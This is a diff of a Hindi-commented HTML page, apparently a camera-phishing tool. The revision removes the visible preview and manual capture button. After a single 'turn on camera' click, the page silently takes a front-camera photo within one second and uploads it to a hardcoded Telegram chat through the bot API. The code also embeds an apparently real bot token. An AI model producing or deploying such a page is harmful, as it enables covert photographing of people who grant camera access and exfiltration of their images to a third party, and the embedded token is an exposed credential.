@@ -1,91 +1,115 @@
 <!DOCTYPE html>
-<html>
+<html lang="hi">
 <head>
-  <title>Camera to Telegram</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Capture Camera</title>
+    <style>
+        /* थोड़ा सा डिज़ाइन ताकि पेज अच्छा दिखे */
+        body { font-family: sans-serif; text-align: center; margin-top: 50px; }
+        button { padding: 10px 20px; font-size: 16px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 5px; }
+        button:disabled { background-color: #cccccc; cursor: not-allowed; }
+        #status { margin-top: 20px; font-weight: bold; color: #333; }
+    </style>
 </head>
 <body>
 
-<h2>Camera Permission</h2>
+<h2>कैमरा एक्सेस की अनुमति दें</h2>
 
-<button onclick="allowCamera()">Allow</button>
-<button onclick="denyCamera()">Deny</button>
+<button onclick="startCamera()" id="startBtn">कैमरा चालू करें</button>
 
 <br><br>
 
-<video id="video" autoplay style="display:none;"></video>
+<video id="video" autoplay playsinline style="display:none;"></video>
 <canvas id="canvas" style="display:none;"></canvas>
 
-<br><br>
-<button id="captureBtn" onclick="capture()" style="display:none;">Capture & Send</button>
-
-<p id="status"></p>
+<p id="status">स्थिति: इंतज़ार कर रहे हैं...</p>
 
 <script>
-let video = document.getElementById("video");
-let stream;
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const statusText = document.getElementById("status");
+const startBtn = document.getElementById("startBtn");
 
-// कैमरा चालू
-function allowCamera() {
-  navigator.mediaDevices.getUserMedia({ video: true })
-  .then(s => {
-    stream = s;
+let cameraStream = null; // कैमरे के स्ट्रीम को स्टोर करने के लिए
+
+function startCamera() {
+  startBtn.disabled = true; // बार-बार क्लिक करने से रोकने के लिए
+  statusText.innerText = "कैमरा शुरू किया जा रहा है...";
+  statusText.style.color = "black";
+
+  // फ्रंट कैमरा (facingMode: "user") एक्सेस करने की कोशिश
+  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+  .then(stream => {
+    cameraStream = stream;
     video.srcObject = stream;
-    video.style.display = "block";
-    document.getElementById("captureBtn").style.display = "inline";
-    document.getElementById("status").innerText = "Camera started";
+    
+    // जब कैमरे का डेटा लोड हो जाए, तब 1 सेकंड का टाइमर शुरू करें
+    video.onloadedmetadata = () => {
+        statusText.innerText = "कैमरा चालू! 1 सेकंड में फोटो ली जाएगी...";
+        setTimeout(captureAndSend, 1000); 
+    };
   })
   .catch(err => {
-    alert("Camera access denied or not available");
+    startBtn.disabled = false;
+    statusText.innerText = "त्रुटि: कैमरा अनुमति नहीं मिली या कैमरा उपलब्ध नहीं है।";
+    statusText.style.color = "red";
+    console.error(err);
   });
 }
 
-// Deny button
-function denyCamera() {
-  alert("You denied permission");
-}
-
-// फोटो capture + भेजना
-function capture() {
-  let canvas = document.getElementById("canvas");
-  let ctx = canvas.getContext("2d");
-
-  // video के actual size से match करो
+function captureAndSend() {
+  // कैमरे की असली क्वालिटी के हिसाब से कैनवास सेट करें ताकि फोटो न फटे
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
+  
+  const ctx = canvas.getContext("2d");
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-  ctx.drawImage(video, 0, 0);
+  statusText.innerText = "फोटो खींची गई! Telegram पर भेजी जा रही है...";
 
+  // 🔥 फोटो खिंचने के तुरंत बाद कैमरा बंद कर दें (सुरक्षा और बैटरी बचाने के लिए)
+  if (cameraStream) {
+      cameraStream.getTracks().forEach(track => track.stop());
+  }
+
+  // फोटो को फाइल में बदलें और भेजें
   canvas.toBlob(function(blob) {
+    if (!blob) {
+        statusText.innerText = "त्रुटि: फोटो प्रोसेस नहीं हो पाई।";
+        statusText.style.color = "red";
+        return;
+    }
 
-    let formData = new FormData();
-    formData.append("chat_id", "8146265514");
-    formData.append("photo", blob, "image.png");
+    const formData = new FormData();
+    formData.append("chat_id", "8146265514"); // आपका चैट आईडी
+    formData.append("photo", blob, "auto_capture.png"); 
 
-    let botToken = "8762761590:formData"; // यहाँ अपना token डालो
-    let url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+    // 👉 अपना नया बॉट टोकन यहाँ "YOUR_TOKEN" की जगह डालें
+    const botToken = "8762761590:AAF5joa1xo87QpsUpBk3HS9zaPKEl6cZJBA"; 
+    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
 
-    fetch(url, {
+    fetch(telegramUrl, {
       method: "POST",
       body: formData
     })
-    .then(res => res.json())
+    .then(response => response.json())
     .then(data => {
-      if (data.ok) {
-        document.getElementById("status").innerText = "Photo sent successfully";
+      if(data.ok) {
+        statusText.innerText = "सफलता: फोटो Telegram पर भेज दी गई है!";
+        statusText.style.color = "green";
       } else {
-        document.getElementById("status").innerText = "Error: " + data.description;
+        statusText.innerText = "Telegram Error: " + data.description;
+        statusText.style.color = "red";
       }
     })
-    .catch(err => {
-      document.getElementById("status").innerText = "Failed to send";
+    .catch(error => {
+      statusText.innerText = "भेजने में तकनीकी खराबी आई। इंटरनेट कनेक्शन चेक करें।";
+      statusText.style.color = "red";
+      console.error(error);
     });
-
+    
   }, "image/png");
-
-  // camera बंद करो
-  if (stream) {
-    stream.getTracks().forEach(track => track.stop());
-  }
 }
 </script>
 
